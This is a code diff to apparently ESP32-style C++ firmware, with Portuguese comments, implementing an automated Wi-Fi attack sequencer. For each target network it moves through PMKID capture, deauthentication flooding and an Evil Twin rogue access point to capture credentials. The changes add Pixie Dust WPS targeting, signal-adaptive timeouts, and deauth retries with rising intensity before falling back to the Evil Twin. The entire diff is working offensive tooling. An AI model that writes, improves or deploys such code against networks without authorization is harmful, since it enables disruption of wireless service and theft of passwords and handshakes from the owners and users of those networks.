@@ -39,12 +39,14 @@ public:
         uint8_t  auth;        // wifi_auth_mode_t cast
         bool     hasWPS;
         bool     wpsPIN;
+        bool     pixieDust;   // WPS pixie dust candidato
         // Resultados
         bool     pmkidCaptured  = false;
         bool     hsCaptured     = false;
         bool     credsCapt      = false;
         uint8_t  deauthRounds   = 0;
         uint8_t  pmkidAttempts  = 0;
+        uint8_t  maxDeauthRetry = 2; // retry deauth antes de ET
         bool     skipped        = false;
     };
 
@@ -85,8 +87,11 @@ public:
             t.channel = ap.channel;
             t.rssi    = (int8_t)ap.rssi;
             t.auth    = (uint8_t)ap.auth;
-            t.hasWPS  = ap.wps;
-            t.wpsPIN  = false;
+            t.hasWPS    = ap.wps;
+            t.wpsPIN    = false;
+            t.pixieDust = false;
+            // Adaptive retry: sinais mais fortes têm mais tentativas de deauth
+            t.maxDeauthRetry = (ap.rssi > -65) ? 3 : (ap.rssi > -75) ? 2 : 1;
             targets.push_back(t);
         }
         // Verifica WPS nos resultados do WPSScanner
@@ -94,7 +99,8 @@ public:
             for (auto& wr : WPSScanner::get().results) {
                 if (wr.bssid == wt.bssid) {
                     wt.hasWPS = true;
-                    wt.wpsPIN = wr.pinEnabled && !wr.locked;
+                    wt.wpsPIN    = wr.pinEnabled && !wr.locked;
+                    wt.pixieDust = wr.pixieDustVuln && !wr.locked;
                     break;
                 }
             }
@@ -154,12 +160,20 @@ public:
                     _nextTarget();
                     return;
                 }
-                if (elapsed > pmkidTimeoutMs) {
-                    LOG.info("[WIFITE] PMKID timeout para " + cur.ssid + " → Deauth phase");
-                    PMKIDFisher::get().stop();
-                    state = DEAUTH_PHASE;
-                    phaseStart = millis();
-                    _startDeauthPhase(cur);
+                {
+                    // Timeout adaptativo: APs mais próximos respondem mais rápido
+                    uint32_t tmo = (cur.rssi > -55) ? pmkidTimeoutMs / 2 :
+                                   (cur.rssi > -70) ? pmkidTimeoutMs :
+                                                      pmkidTimeoutMs + 15000;
+                    if (elapsed > tmo) {
+                        cur.pmkidAttempts++;
+                        PMKIDFisher::get().stop();
+                        LOG.info("[WIFITE] PMKID timeout (" + String(cur.pmkidAttempts) +
+                                 ") para " + cur.ssid + " → Deauth phase");
+                        state = DEAUTH_PHASE;
+                        phaseStart = millis();
+                        _startDeauthPhase(cur);
+                    }
                 }
                 break;
 
@@ -171,18 +185,30 @@ public:
                     _nextTarget();
                     return;
                 }
-                if (elapsed > deauthTimeoutMs) {
-                    cur.deauthRounds++;
-                    Deauther::get().stop();
-                    // Se sinal forte o suficiente tenta Evil Twin
-                    if (cur.rssi > -75 && cur.deauthRounds >= 1) {
-                        LOG.info("[WIFITE] Deauth timeout → Evil Twin para " + cur.ssid);
-                        state = EVIL_TWIN_PHASE;
-                        phaseStart = millis();
-                        _startEvilTwinPhase(cur);
-                    } else {
-                        LOG.info("[WIFITE] Sem resultado para " + cur.ssid + " → próximo alvo");
-                        _nextTarget();
+                {
+                    // Timeout adaptativo baseado em RSSI
+                    uint32_t dtmo = (cur.rssi > -55) ? deauthTimeoutMs / 2 :
+                                    (cur.rssi > -70) ? deauthTimeoutMs :
+                                                       deauthTimeoutMs + 20000;
+                    if (elapsed > dtmo) {
+                        cur.deauthRounds++;
+                        Deauther::get().stop();
+                        if (cur.deauthRounds < cur.maxDeauthRetry) {
+                            // Retry deauth: intensidade cresce a cada round
+                            Deauther::get().intensity = min(2u, (unsigned)cur.deauthRounds);
+                            LOG.info("[WIFITE] Deauth retry " + String(cur.deauthRounds) +
+                                     "/" + String(cur.maxDeauthRetry) + " para " + cur.ssid);
+                            phaseStart = millis();
+                            _startDeauthPhase(cur);
+                        } else if (cur.rssi > -80) {
+                            LOG.info("[WIFITE] Deauth esgotado → Evil Twin para " + cur.ssid);
+                            state = EVIL_TWIN_PHASE;
+                            phaseStart = millis();
+                            _startEvilTwinPhase(cur);
+                        } else {
+                            LOG.info("[WIFITE] Sem resultado para " + cur.ssid + " (sinal fraco) → próximo");
+                            _nextTarget();
+                        }
                     }
                 }
                 break;
@@ -224,6 +250,7 @@ public:
             j += ",\"ch\":" + String(t.channel);
             j += ",\"wps\":" + String(t.hasWPS ? "true" : "false");
             j += ",\"wpsPIN\":" + String(t.wpsPIN ? "true" : "false");
+            j += ",\"pixie\":" + String(t.pixieDust ? "true" : "false");
             j += ",\"pmkid\":" + String(t.pmkidCaptured ? "true" : "false");
             j += ",\"hs\":" + String(t.hsCaptured ? "true" : "false");
             j += ",\"creds\":" + String(t.credsCapt ? "true" : "false");
@@ -247,6 +274,8 @@ private:
                  + t.ssid + " → PMKID phase (30s)");
         if (t.wpsPIN)
             LOG.warn("[WIFITE] !! WPS PIN vulneravel em " + t.ssid + " — ataque manual disponível");
+        if (t.pixieDust)
+            LOG.warn("[WIFITE] !! Pixie Dust candidato: " + t.ssid + " — chipset potencialmente vulnerável");
     }
 
     void _startDeauthPhase(WTarget& t) {
